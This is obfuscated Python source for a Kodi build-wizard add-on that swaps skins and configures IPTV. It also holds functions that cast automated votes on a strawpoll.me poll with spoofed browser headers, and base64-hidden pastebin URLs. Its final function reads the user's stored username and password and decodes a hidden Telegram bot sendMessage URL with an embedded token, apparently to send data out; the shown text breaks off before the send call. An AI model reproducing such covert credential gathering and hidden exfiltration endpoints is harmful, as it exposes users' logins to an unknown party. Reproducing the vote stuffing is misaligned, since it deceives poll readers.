# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPVICTORY =wiz .getS ('keepvictory')#line:138
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:139
KEEPTVLIST =wiz .getS ('keeptvlist')#line:140
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:141
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:142
KEEPHUBTV =wiz .getS ('keephubtv')#line:143
KEEPHUBVOD =wiz .getS ('keephubvod')#line:144
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:145
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:146
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:147
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:148
HARDWAER =wiz .getS ('action')#line:149
USERNAME =wiz .getS ('user')#line:150
PASSWORD =wiz .getS ('pass')#line:151
KEEPWEATHER =wiz .getS ('keepweather')#line:152
KEEPFAVS =wiz .getS ('keepfavourites')#line:153
KEEPSOURCES =wiz .getS ('keepsources')#line:154
KEEPPROFILES =wiz .getS ('keepprofiles')#line:155
KEEPADVANCED =wiz .getS ('keepadvanced')#line:156
KEEPREPOS =wiz .getS ('keeprepos')#line:157
KEEPSUPER =wiz .getS ('keepsuper')#line:158
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:159
KEEPTRAKT =wiz .getS ('keeptrakt')#line:160
KEEPREAL =wiz .getS ('keepdebrid')#line:161
KEEPRD2 =wiz .getS ('keeprd2')#line:162
KEEPLOGIN =wiz .getS ('keeplogin')#line:163
LOGINSAVE =wiz .getS ('loginlastsave')#line:164
DEVELOPER =wiz .getS ('developer')#line:165
THIRDPARTY =wiz .getS ('enable3rd')#line:166
THIRD1NAME =wiz .getS ('wizard1name')#line:167
THIRD1URL =wiz .getS ('wizard1url')#line:168
THIRD2NAME =wiz .getS ('wizard2name')#line:169
THIRD2URL =wiz .getS ('wizard2url')#line:170
THIRD3NAME =wiz .getS ('wizard3name')#line:171
THIRD3URL =wiz .getS ('wizard3url')#line:172
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:173
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:174
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:175
TODAY =date .today ()#line:176
TOMORROW =TODAY +timedelta (days =1 )#line:177
THREEDAYS =TODAY +timedelta (days =3 )#line:178
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:179
MCNAME =wiz .mediaCenter ()#line:180
EXCLUDES =uservar .EXCLUDES #line:181
SPEEDFILE =speedtest .SPEEDFILE #line:182
APKFILE =uservar .APKFILE #line:183
YOUTUBETITLE =uservar .YOUTUBETITLE #line:184
YOUTUBEFILE =uservar .YOUTUBEFILE #line:185
SPEED =speedtest .SPEED #line:186
UNAME =speedtest .UNAME #line:187
ADDONFILE =uservar .ADDONFILE #line:188
ADVANCEDFILE =uservar .ADVANCEDFILE #line:189
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:190
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:191
NOTIFICATION =uservar .NOTIFICATION #line:192
NOTIFICATION2 =uservar .NOTIFICATION2 #line:193
NOTIFICATION3 =uservar .NOTIFICATION3 #line:194
HELPINFO =uservar .HELPINFO #line:195
ENABLE =uservar .ENABLE #line:196
HEADERMESSAGE =uservar .HEADERMESSAGE #line:197
AUTOUPDATE =uservar .AUTOUPDATE #line:198
WIZARDFILE =uservar .WIZARDFILE #line:199
HIDECONTACT =uservar .HIDECONTACT #line:200
SKINID18 =uservar .SKINID18 #line:201
SKINID18DDONXML =uservar .SKINID18DDONXML #line:202
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:203
SKINID17 =uservar .SKINID17 #line:204
SKINID17DDONXML =uservar .SKINID17DDONXML #line:205
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:206
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:207
CONTACT =uservar .CONTACT #line:208
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:209
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:210
HIDESPACERS =uservar .HIDESPACERS #line:211
TMDB_NEW_API =uservar .TMDB_NEW_API #line:212
COLOR1 =uservar .COLOR1 #line:213
COLOR2 =uservar .COLOR2 #line:214
THEME1 =uservar .THEME1 #line:215
THEME2 =uservar .THEME2 #line:216
THEME3 =uservar .THEME3 #line:217
THEME4 =uservar .THEME4 #line:218
THEME5 =uservar .THEME5 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:221
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:222
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:223
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:224
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:225
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:226
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:227
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:228
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:229
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:230
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:231
LOGFILES =wiz .LOGFILES #line:232
TRAKTID =traktit .TRAKTID #line:233
DEBRIDID =debridit .DEBRIDID #line:234
LOGINID =loginit .LOGINID #line:235
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:236
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:237
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:238
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:239
fullsecfold =xbmc .translatePath ('special://home')#line:240
addons_folder =os .path .join (fullsecfold ,'addons')#line:242
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:244
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:246
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:248
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:249
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:250
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:253
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:254
def MainMenu ():#line:261
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:263
def skinWIN ():#line:264
	idle ()#line:265
	O0O0O000OOO0O000O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:266
	O00OOO00OO0000O0O =[];O0OOO00O00OOO0000 =[]#line:267
	for O0OO000OO0000000O in sorted (O0O0O000OOO0O000O ,key =lambda OOO00OO00O0O0OO0O :OOO00OO00O0O0OO0O ):#line:268
		OO0O00O0OOOOO000O =os .path .split (O0OO000OO0000000O [:-1 ])[1 ]#line:269
		OOO0OOOO0OOO0OOOO =os .path .join (O0OO000OO0000000O ,'addon.xml')#line:270
		if os .path .exists (OOO0OOOO0OOO0OOOO ):#line:271
			OO0O00OOO0000O00O =open (OOO0OOOO0OOO0OOOO )#line:272
			OOOOO0OOO0O0O0OOO =OO0O00OOO0000O00O .read ()#line:273
			O0OO00O0O0OOO0O00 =parseDOM2 (OOOOO0OOO0O0O0OOO ,'addon',ret ='id')#line:274
			O00O00OO00OOOO0OO =OO0O00O0OOOOO000O if len (O0OO00O0O0OOO0O00 )==0 else O0OO00O0O0OOO0O00 [0 ]#line:275
			try :#line:276
				O00OOO0OOOOOO0OO0 =xbmcaddon .Addon (id =O00O00OO00OOOO0OO )#line:277
				O00OOO00OO0000O0O .append (O00OOO0OOOOOO0OO0 .getAddonInfo ('name'))#line:278
				O0OOO00O00OOO0000 .append (O00O00OO00OOOO0OO )#line:279
			except :#line:280
				pass #line:281
	O0OO0O000O0OO0000 =[];O0OO0OOO000O0OO0O =0 #line:282
	OOO0000000OO0O000 =["Current Skin -- %s"%currSkin ()]+O00OOO00OO0000O0O #line:283
	O0OO0OOO000O0OO0O =DIALOG .select ("Select the Skin you want to swap with.",OOO0000000OO0O000 )#line:284
	if O0OO0OOO000O0OO0O ==-1 :return #line:285
	else :#line:286
		O000OO000OOOOOOOO =(O0OO0OOO000O0OO0O -1 )#line:287
		O0OO0O000O0OO0000 .append (O000OO000OOOOOOOO )#line:288
		OOO0000000OO0O000 [O0OO0OOO000O0OO0O ]="%s"%(O00OOO00OO0000O0O [O000OO000OOOOOOOO ])#line:289
	if O0OO0O000O0OO0000 ==None :return #line:290
	for O000OO00OOOO0O000 in O0OO0O000O0OO0000 :#line:291
		swapSkins (O0OOO00O00OOO0000 [O000OO00OOOO0O000 ])#line:292
def currSkin ():#line:294
	return xbmc .getSkinDir ('Container.PluginName')#line:295
def swapSkins (O0O000O000O00O00O ,title ="Error"):#line:296
	OOO000OO00OO00O0O ='lookandfeel.skin'#line:297
	O0O0O0OOOO00O000O =O0O000O000O00O00O #line:298
	OOOO0O000O000OO0O =getOld (OOO000OO00OO00O0O )#line:299
	OO0OOOOOOO0O00000 =OOO000OO00OO00O0O #line:300
	setNew (OO0OOOOOOO0O00000 ,O0O0O0OOOO00O000O )#line:301
	OO000000O0O0OOOO0 =0 #line:302
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO000000O0O0OOOO0 <100 :#line:303
		OO000000O0O0OOOO0 +=1 #line:304
		xbmc .sleep (1 )#line:305
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:306
		xbmc .executebuiltin ('SendClick(11)')#line:307
	return True #line:308
def getOld (O0O00OO0O0OO000O0 ):#line:310
	try :#line:311
		O0O00OO0O0OO000O0 ='"%s"'%O0O00OO0O0OO000O0 #line:312
		OO0OOO0O0OO0OO000 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0O00OO0O0OO000O0 )#line:313
		OOO00000OOOOO0OO0 =xbmc .executeJSONRPC (OO0OOO0O0OO0OO000 )#line:315
		OOO00000OOOOO0OO0 =simplejson .loads (OOO00000OOOOO0OO0 )#line:316
		if OOO00000OOOOO0OO0 .has_key ('result'):#line:317
			if OOO00000OOOOO0OO0 ['result'].has_key ('value'):#line:318
				return OOO00000OOOOO0OO0 ['result']['value']#line:319
	except :#line:320
		pass #line:321
	return None #line:322
def setNew (OOO00O00O0O000000 ,OOO00000O00O000OO ):#line:325
	try :#line:326
		OOO00O00O0O000000 ='"%s"'%OOO00O00O0O000000 #line:327
		OOO00000O00O000OO ='"%s"'%OOO00000O00O000OO #line:328
		OOOO00O0OO000000O ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOO00O00O0O000000 ,OOO00000O00O000OO )#line:329
		O000000OO0O00O0OO =xbmc .executeJSONRPC (OOOO00O0OO000000O )#line:331
	except :#line:332
		pass #line:333
	return None #line:334
def idle ():#line:335
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:336
def resetkodi ():#line:338
		if xbmc .getCondVisibility ('system.platform.windows'):#line:339
			OOOOO0OO0O000000O =xbmcgui .DialogProgress ()#line:340
			OOOOO0OO0O000000O .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:343
			OOOOO0OO0O000000O .update (0 )#line:344
			for O0OO00OOOO0000O00 in range (5 ,-1 ,-1 ):#line:345
				time .sleep (1 )#line:346
				OOOOO0OO0O000000O .update (int ((5 -O0OO00OOOO0000O00 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0OO00OOOO0000O00 ),'')#line:347
				if OOOOO0OO0O000000O .iscanceled ():#line:348
					from resources .libs import win #line:349
					return None ,None #line:350
			from resources .libs import win #line:351
		else :#line:352
			OOOOO0OO0O000000O =xbmcgui .DialogProgress ()#line:353
			OOOOO0OO0O000000O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:356
			OOOOO0OO0O000000O .update (0 )#line:357
			for O0OO00OOOO0000O00 in range (5 ,-1 ,-1 ):#line:358
				time .sleep (1 )#line:359
				OOOOO0OO0O000000O .update (int ((5 -O0OO00OOOO0000O00 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0OO00OOOO0000O00 ),'')#line:360
				if OOOOO0OO0O000000O .iscanceled ():#line:361
					os ._exit (1 )#line:362
					return None ,None #line:363
			os ._exit (1 )#line:364
def backtokodi ():#line:366
			wiz .kodi17Fix ()#line:367
			fix18update ()#line:368
			fix17update ()#line:369
def testcommand1 ():#line:371
    import requests #line:372
    O0O0OOOOOO00OOO0O ='18773068'#line:373
    OO0O0O000O000O0O0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0OOOOOO00OOO0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:385
    O00O00O0OO0O0O00O ='145273320'#line:387
    O0OOO0OOO0OOOO000 ='145272688'#line:388
    if ADDON .getSetting ("auto_rd")=='true':#line:389
        O000OOO0O0OO0O0O0 =O00O00O0OO0O0O00O #line:390
    else :#line:391
        O000OOO0O0OO0O0O0 =O0OOO0OOO0OOOO000 #line:392
    O00O0O000000O0000 ={'options':O000OOO0O0OO0O0O0 }#line:396
    O0OO0OO00O0O0000O =requests .post ('https://www.strawpoll.me/'+O0O0OOOOOO00OOO0O ,headers =OO0O0O000O000O0O0 ,data =O00O0O000000O0000 )#line:398
def builde_Votes ():#line:399
   try :#line:400
        import requests #line:401
        O00O0OOO0OO00O0O0 ='18773068'#line:402
        O0OOO00000O000O0O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00O0OOO0OO00O0O0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:414
        OOOO0OO00O000O0OO ='145273320'#line:416
        OOO00000OO00O00OO ={'options':OOOO0OO00O000O0OO }#line:422
        OOO0OO0OO0OOO00O0 =requests .post ('https://www.strawpoll.me/'+O00O0OOO0OO00O0O0 ,headers =O0OOO00000O000O0O ,data =OOO00000OO00O00OO )#line:424
   except :pass #line:425
def update_Votes ():#line:426
   try :#line:427
        import requests #line:428
        O0O00OOOO0OOOOOOO ='18773068'#line:429
        OO000O000OO0OOO00 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O00OOOO0OOOOOOO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:441
        OOO00OO00O0O0OOO0 ='145273321'#line:443
        OOO0OOO0O0O0O000O ={'options':OOO00OO00O0O0OOO0 }#line:449
        OO000O0OOO0O00OO0 =requests .post ('https://www.strawpoll.me/'+O0O00OOOO0OOOOOOO ,headers =OO000O000OO0OOO00 ,data =OOO0OOO0O0O0O000O )#line:451
   except :pass #line:452
def testcommand ():#line:456
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.telemedia')):#line:457
		O00O0000O0000000O =xbmcaddon .Addon ('plugin.video.telemedia')#line:458
	if os .path .exists (os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","plugin.video.telemedia/database","td.binlog")):#line:459
		O00O0000O0000000O .setSetting ('autologin','true')#line:460
def skin_homeselect ():#line:461
	try :#line:463
		O0OOO00000O0000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:464
		O0000OO00O00000O0 =open (O0OOO00000O0000OO ,'r')#line:466
		O000OOO0OO0OOO0OO =O0000OO00O00000O0 .read ()#line:467
		O0000OO00O00000O0 .close ()#line:468
		OOOO0OOO0O000O0OO ='<setting id="HomeS" type="string(.+?)/setting>'#line:469
		OOO0O00OO0OO000OO =re .compile (OOOO0OOO0O000O0OO ).findall (O000OOO0OO0OOO0OO )[0 ]#line:470
		O0000OO00O00000O0 =open (O0OOO00000O0000OO ,'w')#line:471
		O0000OO00O00000O0 .write (O000OOO0OO0OOO0OO .replace ('<setting id="HomeS" type="string%s/setting>'%OOO0O00OO0OO000OO ,'<setting id="HomeS" type="string"></setting>'))#line:472
		O0000OO00O00000O0 .close ()#line:473
	except :#line:474
		pass #line:475
def autotrakt ():#line:478
    O0000OOO0OO0O0O0O =(ADDON .getSetting ("auto_trk"))#line:479
    if O0000OOO0OO0O0O0O =='true':#line:480
       from resources .libs import trk_aut #line:481
def traktsync ():#line:483
     O00OO0OOO0O00O000 =(ADDON .getSetting ("auto_trk"))#line:484
     if O00OO0OOO0O00O000 =='true':#line:485
       from resources .libs import trk_aut #line:488
     else :#line:489
        ADDON .openSettings ()#line:490
def imdb_synck ():#line:492
   try :#line:493
     O00OOO00O00O00O0O =xbmcaddon .Addon ('plugin.video.exodusredux')#line:494
     OO0OOOO0OOOOO00OO =xbmcaddon .Addon ('plugin.video.gaia')#line:495
     O00O0O0000OOOOO00 =(ADDON .getSetting ("imdb_sync"))#line:496
     O0OO00OO00OOO000O ="imdb.user"#line:497
     O0OO000O000OOO0O0 ="accounts.informants.imdb.user"#line:498
     O00OOO00O00O00O0O .setSetting (O0OO00OO00OOO000O ,str (O00O0O0000OOOOO00 ))#line:499
     OO0OOOO0OOOOO00OO .setSetting ('accounts.informants.imdb.enabled','true')#line:500
     OO0OOOO0OOOOO00OO .setSetting (O0OO000O000OOO0O0 ,str (O00O0O0000OOOOO00 ))#line:501
   except :pass #line:502
def dis_or_enable_addon (OO0O0OOOOO000O0OO ,O0OOOOOO0O0OOO0OO ,enable ="true"):#line:504
    import json #line:505
    O00O000000O0OO000 ='"%s"'%OO0O0OOOOO000O0OO #line:506
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O0OOOOO000O0OO )and enable =="true":#line:507
        logging .warning ('already Enabled')#line:508
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0O0OOOOO000O0OO )#line:509
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O0OOOOO000O0OO )and enable =="false":#line:510
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0O0OOOOO000O0OO )#line:511
    else :#line:512
        O000O00O0O000O000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00O000000O0OO000 ,enable )#line:513
        OO0O0OO0O00000OO0 =xbmc .executeJSONRPC (O000O00O0O000O000 )#line:514
        O00O00OO0000000OO =json .loads (OO0O0OO0O00000OO0 )#line:515
        if enable =="true":#line:516
            xbmc .log ("### Enabled %s, response = %s"%(OO0O0OOOOO000O0OO ,O00O00OO0000000OO ))#line:517
        else :#line:518
            xbmc .log ("### Disabled %s, response = %s"%(OO0O0OOOOO000O0OO ,O00O00OO0000000OO ))#line:519
    if O0OOOOOO0O0OOO0OO =='auto':#line:520
     return True #line:521
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:522
def iptvset ():#line:525
  try :#line:526
    OO0OOOO0O0OO0OO0O =(ADDON .getSetting ("iptv_on"))#line:527
    if OO0OOOO0O0OO0OO0O =='true':#line:529
       if KODIV >=17 and KODIV <18 :#line:531
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:532
         O00O0O0O00O0OOOO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:533
         O0000000OOO0OOO00 =(ADDON .getSetting ("iptvUrl"))#line:535
         O00O0O0O00O0OOOO0 .setSetting ('m3uUrl',O0000000OOO0OOO00 )#line:536
         O0O0O000O0OOO0O0O =(ADDON .getSetting ("epg_Url"))#line:537
         O00O0O0O00O0OOOO0 .setSetting ('epgUrl',O0O0O000O0OOO0O0O )#line:538
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:541
         iptvsimpldownpc ()#line:542
         wiz .kodi17Fix ()#line:543
         xbmc .sleep (1000 )#line:544
         O00O0O0O00O0OOOO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:545
         O0000000OOO0OOO00 =(ADDON .getSetting ("iptvUrl"))#line:546
         O00O0O0O00O0OOOO0 .setSetting ('m3uUrl',O0000000OOO0OOO00 )#line:547
         O0O0O000O0OOO0O0O =(ADDON .getSetting ("epg_Url"))#line:548
         O00O0O0O00O0OOOO0 .setSetting ('epgUrl',O0O0O000O0OOO0O0O )#line:549
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:551
         iptvsimpldown ()#line:552
         wiz .kodi17Fix ()#line:553
         xbmc .sleep (1000 )#line:554
         O00O0O0O00O0OOOO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:555
         O0000000OOO0OOO00 =(ADDON .getSetting ("iptvUrl"))#line:556
         O00O0O0O00O0OOOO0 .setSetting ('m3uUrl',O0000000OOO0OOO00 )#line:557
         O0O0O000O0OOO0O0O =(ADDON .getSetting ("epg_Url"))#line:558
         O00O0O0O00O0OOOO0 .setSetting ('epgUrl',O0O0O000O0OOO0O0O )#line:559
  except :pass #line:560
def howsentlog ():#line:567
       try :#line:568
          import json #line:569
          O0OO00O00O0OO00OO =(ADDON .getSetting ("user"))#line:570
          OOOOOO00O0000OO00 =(ADDON .getSetting ("pass"))#line:571
          O0000OO0O00O00O0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:572
          OOOOOOOO00O0OO0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:574
